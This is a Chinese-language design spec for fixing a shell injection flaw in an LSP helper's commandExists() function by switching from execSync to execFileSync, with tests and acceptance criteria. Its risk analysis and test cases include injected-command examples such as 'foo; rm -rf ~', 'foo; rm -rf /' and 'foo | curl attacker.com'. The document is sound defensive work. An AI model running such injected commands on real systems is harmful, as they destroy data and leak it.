# Sub-PRD: T-1c LSP servers.ts Shell 注入修复

> **Status**: APPROVED
> **Context**: 安全加固专项 — 运行时防护
> **Task ID**: T-1c
> **文件**: `src/tools/lsp/servers.ts`（行 155-163）
> **优先级**: P0（安全）

---

## 1. 目标

消除 `commandExists()` 函数中通过模板字符串拼接 shell 命令所产生的 shell 注入漏洞，改用不经过 shell 解析的 `execFileSync` 参数数组调用形式，同时按平台分支处理 Windows (`where`) 与 macOS/Linux (`which`)。

### 在整体方案中的位置

本任务属于 `docs/standards/runtime-protection.md` 所定义的"路径遍历防护与 Hook 输入消毒"安全层的补充，专门针对子进程调用面的注入风险。`commandExists()` 是 LSP 服务器自动检测的核心入口，被 `getAllServers()` 批量调用，攻击面集中。

---

## 2. 接口契约 (I/O)

### 函数签名（不变）

```typescript
export function commandExists(command: string): boolean
```

### Input

| 参数 | 类型 | 来源 | 约束 |
|------|------|------|------|
| `command` | `string` | `LSP_SERVERS[key].command` 的静态内置值 | 来自模块内常量，**当前版本不接受用户运行时输入** |

### Output

| 返回值 | 含义 |
|--------|------|
| `true` | 命令在 PATH 中存在 |
| `false` | 命令不存在，或执行 `which`/`where` 本身失败 |

### Side Effects

无文件写入、无网络请求、无 UI 弹出。仅产生子进程调用（`execFileSync`），进程以 `stdio: 'ignore'` 静默运行。

---

## 3. 数据模型

无新增数据结构。现有相关类型保持不变：

```typescript
// 已有，不修改
export interface LspServerConfig {
  name: string;
  command: string;   // 本函数的输入来源，静态内置字符串
  args: string[];
  extensions: string[];
  installHint: string;
  initializationOptions?: Record<string, unknown>;
}
```

### command 参数来源文档化（安全注释要求）

代码注释必须明确声明 `command` 的信任边界：

```
// SECURITY: command 来源为本模块静态定义的 LSP_SERVERS 常量，
// 不接受用户运行时输入。若未来需支持用户自定义 LSP，
// 必须在调用此函数前对 command 进行白名单校验。
```

---

## 4. 实现规格

### 4.1 当前问题代码（行 155-163）

```typescript
// 当前实现 — 存在 shell 注入风险
export function commandExists(command: string): boolean {
  try {
    const checkCommand = process.platform === 'win32' ? 'where' : 'which';
    execSync(`${checkCommand} ${command}`, { stdio: 'ignore' });  // <-- 危险拼接
    return true;
  } catch {
    return false;
  }
}
```

**风险分析**：如果 `command` 包含 shell 元字符（如 `;`、`|`、`&&`、`$()`），`execSync` 会将整个字符串传给 shell 解析执行，产生命令注入。例如：
- `command = "foo; rm -rf ~"` 在 Linux 会执行删除命令
- `command = "foo | curl attacker.com"` 会产生数据外泄

### 4.2 修复方案（伪代码级别）

```
FUNCTION commandExists(command: string) -> boolean:

  // 防御：拒绝空字符串（避免 which '' 的模糊行为）
  IF command is empty string OR command.trim() is empty:
    RETURN false

  // 按平台选择检测命令（不经 shell 解析）
  IF process.platform === 'win32':
    executable = 'where'
  ELSE:
    executable = 'which'

  TRY:
    // 关键修改：使用 execFileSync 传参数数组，
    // executable 和 command 完全独立，不经 shell 合并
    execFileSync(executable, [command], { stdio: 'ignore' })
    RETURN true
  CATCH:
    RETURN false
```

### 4.3 具体代码修改位置

**文件**: `src/tools/lsp/servers.ts`

**修改 1：import 语句（行 8）**

```typescript
// 原
import { execSync } from 'child_process';

// 改为
import { execFileSync } from 'child_process';
```

**修改 2：commandExists 函数体（行 155-163）**

```typescript
// 原（行 155-163）
export function commandExists(command: string): boolean {
  try {
    const checkCommand = process.platform === 'win32' ? 'where' : 'which';
    execSync(`${checkCommand} ${command}`, { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

// 改为
/**
 * Check if a command exists in PATH.
 *
 * SECURITY: Uses execFileSync with argument array (not execSync with shell
 * interpolation) to prevent shell injection. The `command` parameter is
 * sourced exclusively from the static LSP_SERVERS constant defined in this
 * module. If user-configurable LSP commands are added in the future, callers
 * MUST validate `command` against an allowlist before calling this function.
 */
export function commandExists(command: string): boolean {
  // Guard: reject empty or whitespace-only command to avoid ambiguous behavior
  if (!command || !command.trim()) {
    return false;
  }
  try {
    const checkCommand = process.platform === 'win32' ? 'where' : 'which';
    // Pass command as a separate array element — never interpolated into a shell string
    execFileSync(checkCommand, [command], { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}
```

### 4.4 变更范围确认

| 文件 | 行范围 | 变更类型 |
|------|--------|----------|
| `src/tools/lsp/servers.ts` | 第 8 行 | `import { execSync }` -> `import { execFileSync }` |
| `src/tools/lsp/servers.ts` | 第 152-163 行 | 函数体替换 + 安全注释 |

其余函数（`getServerForFile`、`getAllServers`、`getServerForLanguage`）**不修改**。

---

## 5. 测试用例设计

### 5.1 测试文件位置

新建测试文件：`src/tools/lsp/__tests__/command-exists.test.ts`

### 5.2 Mock 策略

使用 `vi.mock('child_process')` 拦截 `execFileSync`，验证其调用参数形式，而非执行真实子进程。

### 5.3 测试用例清单

#### TC-01：正常路径 — Linux/macOS 命令存在

```
GIVEN: process.platform = 'linux'
  AND: execFileSync 被 mock 为正常返回（不抛出）
WHEN: commandExists('typescript-language-server') 被调用
THEN: 返回 true
  AND: execFileSync 被以 ('which', ['typescript-language-server'], { stdio: 'ignore' }) 调用
  AND: 第一个参数为字符串 'which'（不是 'which typescript-language-server'）
  AND: 第二个参数为数组 ['typescript-language-server']
```

#### TC-02：正常路径 — Windows 命令存在

```
GIVEN: process.platform = 'win32'
  AND: execFileSync 被 mock 为正常返回
WHEN: commandExists('typescript-language-server') 被调用
THEN: 返回 true
  AND: execFileSync 第一个参数为 'where'
  AND: 第二个参数为 ['typescript-language-server']
```

#### TC-03：命令不存在

```
GIVEN: process.platform = 'linux'
  AND: execFileSync 被 mock 为抛出 Error('not found')
WHEN: commandExists('nonexistent-lsp') 被调用
THEN: 返回 false（不抛出异常）
```

#### TC-04：边界情况 — command 为空字符串

```
GIVEN: 任意平台
WHEN: commandExists('') 被调用
THEN: 返回 false
  AND: execFileSync 未被调用（提前返回）
```

#### TC-05：边界情况 — command 含 shell 元字符（注入尝试）

```
GIVEN: process.platform = 'linux'
  AND: execFileSync 被 mock 为对 'which' 抛出（因 'foo; echo injected' 在 which 中不存在）
WHEN: commandExists('foo; echo injected') 被调用
THEN: 返回 false
  AND: execFileSync 以 ('which', ['foo; echo injected'], ...) 被调用
  AND: shell 注入字符串未被展开执行（参数数组确保了这一点）

// 对比验证（仅文档说明，不作为自动测试）：
// 旧实现 execSync('which foo; echo injected') 会执行两个命令
// 新实现 execFileSync('which', ['foo; echo injected']) 将完整字符串作为单一参数传给 which，which 查找字面名称并失败
```

#### TC-06：边界情况 — command 为纯空格

```
GIVEN: 任意平台
WHEN: commandExists('   ') 被调用
THEN: 返回 false
  AND: execFileSync 未被调用
```

#### TC-07：回归验证 — getAllServers 调用链

```
GIVEN: execFileSync 对 'typescript-language-server' 返回正常，其余抛出
WHEN: getAllServers() 被调用
THEN: 返回数组中 typescript 条目的 installed = true
  AND: 其余条目的 installed = false
  AND: 全程无异常抛出
```

### 5.4 现有测试兼容性

现有文件 `client-win32-spawn.test.ts` 和 `client-eviction.test.ts` 已通过 `vi.mock('../servers.js')` 完全 mock 了 `commandExists`，**不受本次修改影响**，无需改动。

---

## 6. 边界情况详细分析

### 6.1 command 为空字符串

- `execFileSync('which', [''])` 在 Linux 上行为不确定（某些系统返回非零码，某些报错）
- 防御性前置检查 `if (!command || !command.trim()) return false` 统一处理

### 6.2 command 含特殊字符（shell 元字符）

| 字符 | 旧实现 execSync 风险 | 新实现 execFileSync 行为 |
|------|----------------------|--------------------------|
| `;` 分号 | 执行后续命令 | 作为字面字符传给 which，查找失败返回 false |
| `\|` 管道 | 执行管道命令 | 同上 |
| `&&` | 短路执行 | 同上 |
| `$()` | 命令替换 | 同上 |
| 空格 | 拆分为多个参数 | 整体作为一个参数名称，which 查找失败 |
| `\n` 换行 | 可能注入多行命令 | 同上 |

### 6.3 Windows `where` 的特殊行为

Windows `where` 命令：
- 支持通配符（如 `where *.exe`），但 `execFileSync` 不经 shell 展开，通配符作为字面量传入，行为安全
- 返回所有匹配路径（多行），对 `commandExists` 只关心退出码，`stdio: 'ignore'` 无影响

### 6.4 `execFileSync` 可用性

`execFileSync` 是 Node.js `child_process` 模块的标准同步 API，与 `execSync` 同在同一模块，无需额外依赖。TypeScript 类型定义在 `@types/node` 中已涵盖，无需修改 `package.json`。

---

## 7. 验收标准

```gherkin
Feature: commandExists shell 注入修复

  Scenario: 成功路径 — Linux 命令存在
    Given process.platform 为 'linux'
    And execFileSync 被 mock 为成功返回
    When 调用 commandExists('pylsp')
    Then 返回 true
    And execFileSync 的调用参数第一个为字符串 'which'，第二个为数组 ['pylsp']

  Scenario: 成功路径 — Windows 命令存在
    Given process.platform 为 'win32'
    And execFileSync 被 mock 为成功返回
    When 调用 commandExists('omnisharp')
    Then 返回 true
    And execFileSync 第一个参数为 'where'，第二个参数为 ['omnisharp']

  Scenario: 命令不存在时安全失败
    Given execFileSync 抛出 Error
    When 调用 commandExists('nonexistent-server')
    Then 返回 false
    And 无异常向上传播

  Scenario: 空字符串提前拦截
    When 调用 commandExists('')
    Then 返回 false
    And execFileSync 从未被调用

  Scenario: shell 元字符不被展开
    Given process.platform 为 'linux'
    And execFileSync 对 ('which', ['foo; rm -rf /']) 调用时抛出（which 找不到该字面命令名）
    When 调用 commandExists('foo; rm -rf /')
    Then 返回 false
    And 系统上未执行 rm -rf 命令

  Scenario: 现有 LSP 测试套件回归
    When 运行 src/tools/lsp/__tests__/ 下全部测试
    Then 全部通过，无失败用例
```

---

## 8. CI 验证要求

按 Axiom CI Gate 规则，实现完成后必须执行：

```bash
# 1. TypeScript 编译检查
tsc --noEmit

# 2. 构建验证
npm run build

# 3. 单元测试
npm test -- src/tools/lsp/__tests__/
```

全部通过后方可宣告任务完成。

---

## 9. 不在本次范围内

- 不修改 `LspClient`、`LspClientManager`、`getServerForFile`、`getServerForLanguage`
- 不引入用户自定义 LSP 服务器的白名单机制（若未来需要，需新建独立任务）
- 不修改 `client.ts` 中 `spawn` 的 `shell` 选项（已由 T-? 处理）
